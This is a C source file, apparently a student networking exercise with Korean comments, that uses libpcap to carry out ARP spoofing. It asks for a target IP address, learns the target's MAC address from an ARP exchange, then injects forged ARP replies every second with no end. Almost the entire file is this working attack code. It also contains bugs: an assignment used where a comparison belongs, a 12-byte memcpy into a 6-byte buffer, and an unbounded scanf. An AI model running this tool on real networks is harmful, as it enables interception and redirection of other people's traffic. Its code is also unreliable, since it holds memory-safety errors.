#include <sys/time.h>
#include <netinet/in.h>
#include <pcap/pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <netinet/if_ether.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/rtnetlink.h>
#include <arpa/inet.h>
#include "networkinfo.h"
#include "arp.h"

int gett_mac(const u_char *packet, u_char *t_mac, char* t_ip);

int main(int argc, char **argv){
    char *dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    int ret;
    struct pcap_pkthdr hdr;
    struct in_addr net_addr, mask_addr;
    struct ether_header *eptr;
    const u_char *packet;
    u_char *cp;
    u_char sp_buf[1024];
    u_char t_ip[16], s_ip[16], g_ip[16], t_mac[6] = {0xff,0xff,0xff,0xff,0xff,0xff}, s_mac[6];

    struct bpf_program fp;

    pcap_t *pcd;  // packet capture descriptor

    dev = pcap_lookupdev(errbuf); // 디바이스 이름
    if (dev == NULL)    {
        printf("%s\n", errbuf);
        exit(1);
    }

    pcd = pcap_open_live(dev, BUFSIZ,  1, 1000, errbuf);
    if (pcd == NULL){
        printf("%s\n", errbuf);
        exit(1);
    }
    printf("Target IP Address: ");
    scanf("%s", t_ip);
    makearpreq(dev, sp_buf, t_ip);

    if((pcap_inject(pcd,sp_buf,sizeof(struct ether_header)+sizeof(struct ether_arp))) ==-1) {
        pcap_perror(pcd,0);
        pcap_close(pcd);
        exit(1);
    };
    // 패킷이 캡쳐되면 callback함수를 실행한다.
    while(1){
        packet = pcap_next(pcd, &hdr);
        if(gett_mac(packet, t_mac, t_ip) == 1)
            break;
    }

    makearprep(dev, sp_buf, t_ip, t_mac);

    while(1){
        printf("send arp reply packet\n");
        if((pcap_inject(pcd,sp_buf,sizeof(struct ether_header)+sizeof(struct ether_arp))) ==-1) {
            pcap_perror(pcd,0);
            pcap_close(pcd);
            exit(1);
        };
        sleep(1);
    }
    return 0;
}
int gett_mac(const u_char *packet, u_char * t_mac, char* t_ip){
    struct ether_header *etheh; // Ethernet 헤더 구조체
    unsigned short ether_type;

    // 이더넷 헤더를 가져온다.
    etheh = (struct ether_header *)packet;
    packet += sizeof(struct ether_header);
    // 네트워크 패킷은 big redian 이라서 little redian형식으로 바꿔준다.
    ether_type = ntohs(etheh->ether_type);

    if (ether_type == ETHERTYPE_ARP){
        struct ether_arp *arph; // arp 헤더 구조체
        arph = (struct ether_arp *)packet;
        packet += sizeof(struct ether_arp);
        if(arph->ea_hdr.ar_op = 2){
            char tip[16];
            inet_ntop(AF_INET, &arph->arp_spa, tip, sizeof(tip));
            if(!strcmp(tip, t_ip)){
                memcpy(t_mac, arph->arp_sha, 12);
                return 1;
            }
        }
    }
    return 0;
}
